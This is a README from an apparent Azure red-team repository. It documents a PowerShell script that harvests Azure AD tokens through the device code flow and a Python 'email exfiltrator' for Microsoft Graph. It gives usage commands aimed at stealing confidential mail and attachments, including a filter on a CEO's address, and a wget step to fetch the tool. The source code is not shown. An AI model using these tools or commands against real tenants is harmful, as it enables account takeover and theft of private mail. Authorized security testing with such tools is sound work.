# Azure Pentesting Resource

---

# Scripts

# token_polling.ps1

## Azure AD Device Code Authentication Token Harvester

A PowerShell script that demonstrates automated token acquisition using the Azure AD device code flow authentication. The script targets Microsoft's authentication endpoints to obtain access and refresh tokens that can be used for various Microsoft services (Graph API, Azure Resource Manager, etc.).

### Features
- Implements the complete OAuth 2.0 device code flow
- Automatically handles device code request and token polling
- Configurable resource endpoint targeting (Graph API, Azure RM, etc.)
- Built-in error handling and timeout management
- Retrieves both access and refresh tokens
- Uses the Azure PowerShell client ID for broad API access

### How it Works
1. Requests a device code from Azure AD's OAuth endpoint
2. Displays authentication URL and user code for sign-in
3. Continuously polls the token endpoint while waiting for user authentication
4. Upon successful authentication, retrieves and outputs the access token
5. Silently stores the refresh token for potential reuse

### Usage

```bash
pwsh
.\query.ps1
```

## Authentication Flow
1. When executed, the script will output something like:
```bash
Requesting device code...
Authentication URL: https://microsoft.com/devicelogin
User Code: ABCD-EFGH
Please visit the authentication URL, enter the code above, and sign in.
```
2. Visit the provided URL in your browser
3. Enter the displayed code
4. Sign in with your Microsoft account
5. The script will automatically detect the authentication and retrieve the token

#### Resource Targeting
The script defaults to Microsoft Graph API but can be modified to target other Microsoft API endpoints by changing the `$resource` variable:
- Microsoft Graph: `https://graph.microsoft.com`
- Azure Resource Manager: `https://management.azure.com/`
- Classic Azure Management: `https://management.core.windows.net/`

### Notes
- The script includes automatic retry logic for token polling
- Handles rate limiting automatically
- Includes timeout functionality
- Stores both access and refresh tokens
- Access token is output to console
- Refresh token is stored in variable but not displayed

### Error Handling
The script will gracefully handle common errors:
- Authentication timeout
- Rate limiting
- Invalid codes
- Network issues

---

# exfil_exchange_email.py

## Microsoft Graph Email Exfiltrator

A Python script that leverages Microsoft Graph API access tokens to retrieve and save emails from Exchange Online/Microsoft 365 mailboxes. The script provides flexible email extraction capabilities with advanced filtering options for precise targeting.

### Features
- Automated email content extraction using Microsoft Graph API
- Complete mailbox access with token authentication
- Saves email bodies, attachments, and metadata
- Organized directory structure for extracted data
- Advanced filtering capabilities:
  - Content-based search
  - Date ranges
  - Sender/recipient filtering
  - Importance levels
  - Attachment presence and types
  - Size-based filtering
  - Term exclusion
- Handles rate limiting and pagination
- Proper error handling and recovery

### Requirements
- Python 3.x
- Required packages:
  ```
  requests
  ```

### Installation
```bash
wget https://raw.githubusercontent.com/0xG00S3/Azure/refs/heads/main/exfil_exchange_email.py
```

### Usage

#### Basic Usage
Pull all emails from inbox:
```bash
python3 exfil_exchange_email.py --token "your_graph_api_token"
```

#### Advanced Filtering Examples

1. Search for sensitive documents:
```bash
python3 exfil_exchange_email.py --token "your_token" \
--query "confidential,secret,internal" \
--has-attachments \
--importance "high"
```

2. Target date ranges with specific attachment types:
```bash
python3 exfil_exchange_email.py --token "your_token" \
--start-date "2024-01-01" \
--end-date "2024-03-01" \
--attachment-types ".pdf,.docx" \
--min-size 1000000
```

3. Filter by sender and exclude terms:
```bash
python3 exfil_exchange_email.py --token "your_token" \
--from-address "ceo@company.com" \
--exclude-terms "newsletter,automated" \
--max-emails 100
```

#### Available Arguments
```bash
--token Required. Microsoft Graph API token
--output Output directory (default: exfiltrated_emails)
--query Search terms (comma-separated)
--max-emails Maximum number of emails to retrieve
--folder Mailbox folder to search (default: inbox)
--start-date Start date (YYYY-MM-DD)
--end-date End date (YYYY-MM-DD)
--from-address Filter by sender email
--to-address Filter by recipient email
--importance Filter by importance (high/normal/low)
--has-attachments Filter for emails with attachments
--attachment-types Attachment extensions to filter (e.g., .pdf,.docx)
--exclude-terms Terms to exclude (comma-separated)
--min-size Minimum email size in bytes
--max-size Maximum email size in bytes
```

#### Output Structure
```bash
exfiltrated_emails/
├── YYYYMMDD_HHMMSS_EmailSubject1/
│ ├── body.html
│ ├── metadata.json
│ └── attachments/
│ ├── document1.pdf
│ └── document2.docx
├── YYYYMMDD_HHMMSS_EmailSubject2/
│ ├── body.txt
│ └── metadata.json
```

#### Notes
- Requires a valid Microsoft Graph API token with Mail.Read permissions
- Rate limiting is handled automatically with exponential backoff
- Attachments are saved in their original format
- HTML emails preserve their formatting
- All metadata is saved in JSON format for easy parsing

#### Disclaimer
This tool is intended for authorized security testing and red team operations only. Ensure you have proper authorization before using this tool against any target systems.


---

Everything in this repository is to be used for educational purposes only.






















